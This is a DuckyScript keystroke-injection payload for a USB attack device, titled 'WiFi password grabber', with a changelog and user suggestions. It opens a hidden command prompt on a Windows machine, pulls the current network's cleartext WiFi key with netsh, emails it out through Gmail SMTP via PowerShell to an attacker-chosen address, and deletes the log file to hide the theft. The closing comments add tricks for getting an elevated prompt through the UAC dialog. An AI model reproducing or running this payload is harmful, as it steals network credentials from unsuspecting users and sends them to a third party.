REM ### Change the following things;
REM * **ACCOUNT**: Your **gmail account**
REM * **PASSWORD**: Your **gmail password**
REM * **RECEIVER**: The email you want to send the content of Log.txt to
REM 
```
REM Title: WiFi password grabber
REM Author: Siem
REM Version: 4
REM Description: Saves the SSID, Network type, Authentication and the password to Log.txt and emails the contents of Log.txt from a gmail account.
DELAY 3000
REM --> Minimize all windows
WINDOWS d
REM --> Open cmd
WINDOWS r
DELAY 500
STRING cmd
ENTER
DELAY 200
REM --> Getting SSID
STRING cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=:" %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set A=%A
ENTER
STRING set A="%A:~1%"
ENTER
REM --> Creating A.txt
STRING netsh wlan show profiles %A% key=clear | findstr /c:"Network type" /c:"Authentication" /c:"Key Content" | findstr /v "broadcast" | findstr /v "Radio">>A.txt
ENTER
REM --> Get network type
STRING for /f "tokens=3 delims=: " %A in ('findstr "Network type" A.txt') do set B=%A
ENTER
REM --> Get authentication
STRING for /f "tokens=2 delims=: " %A in ('findstr "Authentication" A.txt') do set C=%A
ENTER
REM --> Get password
STRING for /f "tokens=3 delims=: " %A in ('findstr "Key Content" A.txt') do set D=%A
ENTER
REM --> Delete A.txt
STRING del A.txt
ENTER
REM --> Create Log.txt
STRING echo SSID: %A%>>Log.txt & echo Network type: %B%>>Log.txt & echo Authentication: %C%>>Log.txt & echo Password: %D%>>Log.txt
ENTER
REM --> Mail Log.txt
STRING powershell
ENTER
STRING $SMTPServer = 'smtp.gmail.com'
ENTER
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
STRING $SMTPInfo.EnableSsl = $true
ENTER
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('ACCOUNT@gmail.com', 'PASSWORD')
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
ENTER
STRING $ReportEmail.From = 'ACCOUNT@gmail.com'
ENTER
STRING $ReportEmail.To.Add('RECEIVER@gmail.com')
ENTER
STRING $ReportEmail.Subject = 'WiFi key grabber'
ENTER
STRING $ReportEmail.Body = (Get-Content Log.txt | out-string)
ENTER
STRING $SMTPInfo.Send($ReportEmail)
ENTER
DELAY 1000
STRING exit
ENTER
DELAY 500
REM --> Delete Log.txt and exit
STRING del Log.txt & exit
ENTER
```

REM ### Change log;
REM 1. Original
REM 2. Bug fixes and narrowed commands
REM 3. Send contents of Log.txt instead the file itself
REM 4. Removed the space as delimiter
REM 5. Added the STRING set A="%A:~1%" to be able to use SSID's with spaces as well
REM 
REM ### Suggestions;
REM **If you have any suggestions, write them down here.**
REM 
REM - For me i needed to add a DELAY 50 betwin the powershell exit and the cmd exit.. (But i'm on an Arduino Mini with a special compiler)
REM - If the wifi ssid has a space like "TPLINK HOME" then A would be set to "TPLINK" and get error "Profile "TPLINK" is not found on the system" -- FIXED
REM - Added the delay after sending the SMTP message, to make sure the EXIT and DEL log.txt are executed (I had issues with this)
REM 
REM The cmd prompt must be elevated to get any passwords.  If you change from using the WINDOWS r to using the search menu for "cmd" and pressing ctrl+shift+enter you can get a UAC prompt.  From there you'd need to alt+Y to get the elevated prompt.
REM 
REM You can also use the run box but with the following command in Win7 and later:
REM powershell Start-Process cmd -Verb runAs
